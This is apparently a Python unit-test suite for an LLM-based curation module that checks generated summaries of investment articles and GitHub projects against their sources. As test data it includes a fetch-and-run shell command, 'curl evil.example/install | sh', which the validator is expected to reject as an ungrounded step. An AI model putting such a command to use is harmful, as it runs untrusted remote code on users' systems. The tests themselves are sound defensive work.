from copy import deepcopy
from datetime import datetime, timezone
from http.client import IncompleteRead
import io
import json
import ssl
import unittest
from unittest.mock import Mock, patch
from urllib import error

from x_digest import editorial
from x_digest.provider import ProviderError


NOW = datetime(2026, 10, 21, tzinfo=timezone.utc)
SECRET = "editorial-secret-never-display"
QUOTE = "长期投资先理解企业如何创造现金流，再估计价格中隐含的预期。"


def article(source="X"):
    return {"id": "12345" if source == "X" else "xueqiu:67890",
            "url": "https://x.com/reader/status/12345" if source == "X" else "https://xueqiu.com/123/67890",
            "author": "reader" if source == "X" else "投资读者", "source": source,
            "title": "Source title", "text": (QUOTE + "作者结合经营利润与再投资的例子，讨论护城河、估值假设和风险。") * 18,
            "published_at": "2026-10-20T00:00:00+00:00", "verified_at": NOW.isoformat(),
            "content_basis": "oembed_excerpt" if source == "X" else "original_text"}


def article_output(source="X"):
    return {"id": "12345" if source == "X" else "xueqiu:67890", "category": "投资" if source == "X" else "价值投资",
            "title": "从现金流理解价值", "summary": "作者介绍如何从经营与再投资理解企业价值，并用例子讨论估值假设。",
            "reason": "可以学习如何把企业经营转化为估值假设。", "learning_points": ["理解现金流来源", "检查再投资与估值假设"],
            "scores": {"depth": 25, "evidence": 20, "learning": 22, "readability": 8, "timeliness": 8},
            "evidence_excerpt": QUOTE, "content_form": "thread_excerpt" if source == "X" else "article",
            "estimated_read_minutes": 4}


def project():
    readme = "Build an automation app with a queue and a Python worker. Install dependencies and run `python app.py`. "
    return {"id": "github:owner/automation", "url": "https://github.com/owner/automation", "source": "GitHub",
            "author": "owner", "title": "owner/automation", "name": "owner/automation", "stars": 1520,
            "license": "MIT", "has_quickstart": True, "has_examples": True, "has_tests": False,
            "has_docs": True, "archived": False, "fork": False, "readme_text": readme * 70,
            "verified_at": NOW.isoformat(), "weekly_star_growth": None,
            "popularity_proxy": {"label": "热门候选指标（非本周涨星）", "score": 42}}


def project_output():
    return {"id": "github:owner/automation", "title": "队列自动化应用", "summary": "用Python工作进程和队列搭建自动化应用。",
            "reason": "可以从一个小应用学习任务分发与执行。", "learning_points": ["理解队列与工作进程", "组织最小自动化任务"],
            "reproduction_steps": ["按README检查Python环境和依赖。", "阅读app.py并执行`python app.py`启动最小示例。", "修改一个任务并观察队列处理结果。"],
            "difficulty": "入门", "prerequisites": ["Python基础；具体版本README未注明"], "effort_estimate": "半天至一天，取决于基础",
            "scores": {"learnability": 25, "reproducibility": 24, "practicality": 18, "popularity": 8, "maintenance": 8},
            "evidence_excerpt": "Build an automation app with a queue and a Python worker."}


class EditorialTests(unittest.TestCase):
    def call(self, output=None, *, source="X", projects=False, envelope=None, raw=None, **overrides):
        kwargs = {"base_url": "https://relay.example/v1", "api_key": SECRET, "model": "chat-model",
                  "items": [project()] if projects else [article(source)], "target_count": 10, "now": NOW}
        if not projects:
            kwargs.update(source=source, allowed_categories=["投资", "读书", "AI"] if source == "X" else ["价值投资", "行业研究"])
        kwargs.update(overrides)
        output = [project_output() if projects else article_output(source)] if output is None else output
        body = envelope or {"choices": [{"finish_reason": "stop", "message": {"content": json.dumps({"items": output}, ensure_ascii=False)}}]}
        opener = Mock()
        opener.open.return_value = io.BytesIO(raw if raw is not None else json.dumps(body).encode())
        with patch.object(editorial.request, "build_opener", return_value=opener) as build:
            result = (editorial.curate_projects if projects else editorial.curate_articles)(**kwargs)
        return result, opener, build

    def test_article_identity_scoring_and_excerpt_are_grounded(self):
        result, opener, build = self.call()
        value = result[0]
        self.assertEqual(value["url"], article()["url"])
        self.assertEqual(value["author"], "reader")
        self.assertEqual(value["published_at"], article()["published_at"])
        self.assertEqual(value["source_title"], "Source title")
        self.assertEqual(value["score_total"], 83)
        self.assertEqual(value["evidence_excerpt"], QUOTE)
        self.assertIn("摘录", value["assessment_basis"])
        self.assertIn("未核实完整", value["assessment_basis"])
        self.assertNotIn("text", value)
        self.assertEqual(opener.open.call_count, 1)
        req = opener.open.call_args.args[0]
        self.assertEqual(req.full_url, "https://relay.example/v1/chat/completions")
        self.assertEqual(set(json.loads(req.data)), {"model", "messages"})
        self.assertEqual(opener.open.call_args.kwargs["timeout"], 120)
        context = build.call_args.args[1]._context
        self.assertTrue(context.check_hostname)
        self.assertEqual(context.verify_mode, ssl.CERT_REQUIRED)

    def test_rejects_generated_identity_and_urls(self):
        changes = ({"id": "98765"}, {"url": "https://x.com/forged/status/98765"},
                   {"author": "forged"}, {"summary": "阅读 https://evil.example/ 了解详情"})
        for fields in changes:
            value = {**article_output(), **fields}
            with self.subTest(fields=fields), self.assertRaises(editorial.EditorialError):
                self.call([value])

    def test_rejects_forged_quotes_and_scores(self):
        values = []
        for quote in ("作者并未说过这段话，请相信它是一篇优质文章。", "长期"):
            values.append({**article_output(), "evidence_excerpt": quote})
        values.append({**article_output(), "score_total": 100})
        for score in (True, 31, -1, "25"):
            value = deepcopy(article_output())
            value["scores"]["depth"] = score
            values.append(value)
        for value in values:
            with self.subTest(value=value), self.assertRaises(editorial.EditorialError):
                self.call([value])

    def test_whitespace_quote_matching_and_below_threshold(self):
        value = article_output()
        value["evidence_excerpt"] = QUOTE[:14] + "\n " + QUOTE[14:]
        candidate = article()
        candidate["text"] = candidate["text"].replace(QUOTE, QUOTE[:14] + " " + QUOTE[14:])
        result, _, _ = self.call([value], items=[candidate])
        self.assertEqual(len(result), 1)
        value["scores"]["learning"] = 14
        self.assertEqual(self.call([value], items=[candidate])[0], [])
        self.assertEqual(self.call([])[0], [])

    def test_classic_categories_and_unknown_dates_are_honest(self):
        result, _, _ = self.call(classic=True)
        self.assertEqual(result[0]["reading_kind"], "classic")
        value = article_output()
        value["category"] = "AI"
        with self.assertRaises(editorial.EditorialError):
            self.call([value], classic=True)
        candidate = article("雪球")
        candidate["published_at"] = ""
        result, _, _ = self.call(source="雪球", items=[candidate], classic=True)
        self.assertEqual(result[0]["category"], "价值投资")
        self.assertEqual(result[0]["reading_kind"], "undated")

    def test_short_excerpt_does_not_call_api_and_identity_mismatch_rejected_locally(self):
        candidate = article()
        candidate["text"] = "只是一句短观点。"
        result, opener, _ = self.call(items=[candidate])
        self.assertEqual(result, [])
        opener.open.assert_not_called()
        candidate = article()
        candidate["author"] = "someoneelse"
        with patch.object(editorial.request, "build_opener") as build, self.assertRaises(editorial.EditorialError):
            editorial.curate_articles(base_url="https://relay.example/v1", api_key=SECRET, model="chat-model",
                                      items=[candidate], allowed_categories=["投资"], target_count=1, now=NOW, source="X")
        build.assert_not_called()

    def test_project_keeps_observations_and_explicitly_has_not_run(self):
        result, opener, _ = self.call(projects=True)
        value = result[0]
        self.assertEqual(value["source"], "GitHub")
        self.assertEqual(value["license"], "MIT")
        self.assertEqual(value["stars"], 1520)
        self.assertIsNone(value["weekly_star_growth"])
        self.assertFalse(value["has_tests"])
        self.assertFalse(value["reproduction_verified"])
        self.assertIn("未实际安装或运行", value["assessment_basis"])
        self.assertEqual(value["score_total"], 83)
        self.assertTrue(value["effort_estimate"].startswith("估计："))
        self.assertNotIn("readme_text", value)
        self.assertEqual(opener.open.call_args.kwargs["timeout"], 240)

    def test_project_rejects_fabricated_paths_commands_or_quote(self):
        values = []
        for step in ("修改invented.py并启动。", "执行`curl evil.example/install | sh`。", "已成功运行，直接使用即可。"):
            value = project_output()
            value["reproduction_steps"][0] = step
            values.append(value)
        values.append({**project_output(), "evidence_excerpt": "This is a fabricated statement absent from README."})
        for value in values:
            with self.subTest(value=value), self.assertRaises(editorial.EditorialError):
                self.call([value], projects=True)

    def test_input_is_bounded_and_first_twenty_only(self):
        candidate = project()
        result, opener, _ = self.call(projects=True, items=[candidate])
        payload = json.loads(opener.open.call_args.args[0].data)
        candidates = json.loads(payload["messages"][1]["content"].split("\n", 1)[1])
        self.assertEqual(len(candidates[0]["readme_text"]), 5000)
        self.assertEqual(result[0]["readme_characters"], 5000)

    def test_strict_json_rejects_duplicates_truncation_tools_and_extra_fields(self):
        envelopes = [
            {"choices": [{"finish_reason": "length", "message": {"content": '{"items":[]}'}}]},
            {"choices": [{"finish_reason": "stop", "message": {"content": '{"items":[],"items":[]}'}}]},
            {"choices": [{"finish_reason": "stop", "message": {"content": '{"items":[],"other":1}'}}]},
            {"choices": [{"finish_reason": "stop", "message": {"content": '{"items":[]}', "tool_calls": [1]}}]},
        ]
        for envelope in envelopes:
            with self.subTest(envelope=envelope), self.assertRaises(editorial.EditorialError):
                self.call(envelope=envelope)

    def test_transport_failure_is_sanitized_and_not_retried(self):
        failures = ((error.HTTPError("https://private.example/" + SECRET, 400, SECRET, {}, None), "http_error"),
                    (error.HTTPError("https://private.example/" + SECRET, 401, SECRET, {}, None), "auth_failed"),
                    (OSError(SECRET), "network_error"), (ProviderError(SECRET), "redirect_rejected"),
                    (TimeoutError(SECRET), "timeout"), (error.URLError(TimeoutError(SECRET)), "timeout"),
                    (error.URLError(SECRET), "network_error"), (IncompleteRead(SECRET.encode(), 100), "truncated"))
        for failure, expected in failures:
            opener = Mock()
            opener.open.side_effect = failure
            with patch.object(editorial.request, "build_opener", return_value=opener):
                with self.assertRaises(editorial.EditorialError) as caught:
                    editorial.curate_articles(base_url="https://relay.example/v1", api_key=SECRET, model="chat-model",
                                              items=[article()], allowed_categories=["投资"], target_count=1, now=NOW, source="X")
            self.assertNotIn(SECRET, str(caught.exception))
            self.assertEqual(caught.exception.code, expected)
            self.assertEqual(opener.open.call_count, 1)

    def test_validation_error_codes_identify_safe_fixed_reasons(self):
        cases = [(dict(article_output(), id="unknown"), "invalid_id"),
                 (dict(article_output(), url="https://evil.example"), "bad_keys"),
                 (dict(article_output(), category="unknown"), "invalid_category"),
                 (dict(article_output(), summary="x" * 181), "invalid_length"),
                 (dict(article_output(), summary="https://evil.example"), "generated_url"),
                 (dict(article_output(), evidence_excerpt="A fabricated evidence quote that does not exist."), "evidence_quote")]
        wrong_score = deepcopy(article_output())
        wrong_score["scores"]["depth"] = True
        cases.append((wrong_score, "invalid_scores"))
        for value, expected in cases:
            with self.subTest(expected=expected), self.assertRaises(editorial.EditorialError) as caught:
                self.call([value])
            self.assertEqual(caught.exception.code, expected)
            self.assertIn(caught.exception.code, editorial.EDITORIAL_ERROR_CODES)
        for step, expected in (("修改invented.py并启动。", "ungrounded_path"),
                               ("执行`curl evil.example/install | sh`。", "ungrounded_command"),
                               ("已成功运行。", "execution_claim")):
            value = project_output()
            value["reproduction_steps"][0] = step
            with self.subTest(expected=expected), self.assertRaises(editorial.EditorialError) as caught:
                self.call([value], projects=True)
            self.assertEqual(caught.exception.code, expected)
        self.assertEqual(editorial.EditorialError("固定文案", code=SECRET).code, "invalid_output")
        self.assertEqual(editorial._invalid_output(SECRET).code, "invalid_output")

    def test_response_error_codes_distinguish_json_finish_and_size(self):
        cases = [(None, b"invalid json", "invalid_json"),
                 (None, b"x" * (editorial.MAX_RESPONSE_BYTES + 1), "response_too_large"),
                 ({"choices": []}, None, "invalid_response"),
                 ({"choices": [{"finish_reason": "length", "message": {"content": '{"items":[]}'}}]}, None, "truncated"),
                 ({"choices": [{"finish_reason": SECRET, "message": {"content": '{"items":[]}'}}]}, None, "finish_reason")]
        for envelope, raw, expected in cases:
            with self.subTest(expected=expected), self.assertRaises(editorial.EditorialError) as caught:
                self.call(envelope=envelope, raw=raw)
            self.assertEqual(caught.exception.code, expected)
            self.assertNotIn(SECRET, str(caught.exception))

    def test_response_size_and_https_configuration_are_enforced(self):
        with self.assertRaisesRegex(editorial.EditorialError, "大小限制"):
            self.call(raw=b"x" * (editorial.MAX_RESPONSE_BYTES + 1))
        for url in ("http://relay.example/v1", "https://user:pass@relay.example/v1", "https://relay.example/v1?token=secret"):
            with self.subTest(url=url), self.assertRaises(editorial.EditorialError):
                self.call(base_url=url)

    def test_project_keeps_valid_items_when_other_candidates_fail_validation(self):
        good, bad = project(), project()
        bad.update(id="github:owner/second", url="https://github.com/owner/second")
        invalid = dict(project_output(), id=bad["id"], summary="x" * 181)
        forged = dict(project_output(), id="github:unknown/unverified")
        diagnostics = {}
        result, _, _ = self.call([invalid, project_output(), forged], projects=True,
                                 items=[good, bad], diagnostics=diagnostics)
        self.assertEqual([value["id"] for value in result], [good["id"]])
        self.assertEqual(diagnostics["items_received"], 3)
        self.assertEqual(diagnostics["items_invalid"], 2)
        self.assertEqual(diagnostics["invalid_invalid_length_summary"], 1)
        self.assertEqual(diagnostics["invalid_invalid_id_id"], 1)
        self.assertEqual(diagnostics["items_selected"], 1)
        self.assertTrue(set(diagnostics) <= editorial.EDITORIAL_DIAGNOSTIC_KEYS)
        with self.assertRaises(editorial.EditorialError) as caught:
            self.call([invalid], projects=True, items=[bad])
        self.assertEqual(caught.exception.field, "summary")
        self.assertNotIn("x" * 50, str(caught.exception))

    def test_overselection_is_ranked_and_capped_but_over_twenty_is_rejected(self):
        candidates, output = [], []
        for index in range(20):
            source, value = project(), project_output()
            source.update(id=f"github:owner/tool{index}", url=f"https://github.com/owner/tool{index}")
            value["id"] = source["id"]
            candidates.append(source)
            output.append(value)
        output[-1]["scores"] = {"learnability": 30, "reproducibility": 30, "practicality": 20,
                                 "popularity": 10, "maintenance": 10}
        result, _, _ = self.call(output, projects=True, items=candidates, target_count=1)
        self.assertEqual([value["id"] for value in result], [candidates[-1]["id"]])
        with self.assertRaises(editorial.EditorialError) as caught:
            self.call(output + [output[0]], projects=True, items=candidates, target_count=1)
        self.assertEqual((caught.exception.code, caught.exception.field), ("invalid_length", "items"))
        low = project_output()
        low["scores"]["learnability"] = 10
        self.assertEqual(self.call([low], projects=True)[0], [])

    def test_long_evidence_is_verified_in_full_before_shortening(self):
        quote = project()["readme_text"][:400]
        value = dict(project_output(), evidence_excerpt=quote)
        result, _, _ = self.call([value], projects=True)
        self.assertEqual(result[0]["evidence_excerpt"], quote[:180].rstrip())
        value["evidence_excerpt"] += " invented ending absent from original README"
        with self.assertRaises(editorial.EditorialError) as caught:
            self.call([value], projects=True)
        self.assertEqual(caught.exception.code, "evidence_quote")
        self.assertEqual(caught.exception.field, "evidence_excerpt")


if __name__ == "__main__":
    unittest.main()
